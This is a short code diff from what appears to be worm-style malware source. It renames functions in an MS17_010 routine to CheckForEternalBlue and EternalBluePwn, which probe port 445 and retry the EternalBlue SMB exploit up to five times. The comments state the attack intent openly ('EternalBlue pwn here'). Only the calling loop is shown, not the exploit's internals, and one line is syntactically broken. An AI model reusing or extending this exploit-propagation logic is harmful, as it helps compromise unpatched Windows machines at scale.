@@ -397,7 +397,7 @@ DWORD MS17_010(DWORD LPPARAM)
 	lpparam = (struct in_addr) ;
 	int attemptCount;
 	//CheckMS17Vulnerability here; continue if vulnerable
-	if ( tryFirstSetBuffers(&target, 445))
+	if ( CheckForEternalBlue(&target, 445))
 	{
 		attemptCount = 0;
 		do
@@ -407,7 +407,7 @@ DWORD MS17_010(DWORD LPPARAM)
 			      break;
 		      	Sleep(3000);
 			//EternalBlue pwn here
-		      	trySecondSetBuffers(&target, 445);
+		      	EternalBluePwn(&target, 445);
 		      	++attemptCount;
 		 } while ( attemptCount < 5 );
 	}
